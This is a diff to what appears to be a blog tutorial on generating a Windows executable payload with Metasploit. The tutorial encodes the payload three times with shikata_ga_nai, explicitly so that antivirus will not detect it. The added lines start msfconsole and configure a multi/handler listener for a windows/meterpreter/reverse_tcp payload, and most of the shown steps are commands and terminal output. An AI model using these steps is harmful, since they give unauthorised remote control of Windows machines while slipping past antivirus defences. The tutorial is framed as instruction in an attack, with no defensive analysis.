@@ -18,7 +18,7 @@ I explain to you
 <p>x86/shikata_ga_nai -i 3 -b "\x00", the module that will help us encode our file so as not to be detected by the antivirus, we encoded it 3 times.</p>
 <p>the output file will be hello.exe </p>
 
-`result`
+`output`
 ```terminal
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 Found 1 compatible encoders
@@ -35,6 +35,25 @@ let's check if it's the windows exectable.
 ```terminal
 file hello.exe
 ```
+output:
 ```output
 hello.exe: PE32 executable (GUI) Intel 80386, for MS Windows
 ```
+now we will head to metasploit.
+```terminal
+msfconsole
+```
+output:
+```output
+msf6 > use exploit/multi/handler
+```
+after
+```terminal
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) >set payload windows/meterpreter/reverse_tcp
+```
+output:
+```output
+payload => windows/meterpreter/reverse_tcp
+```
+
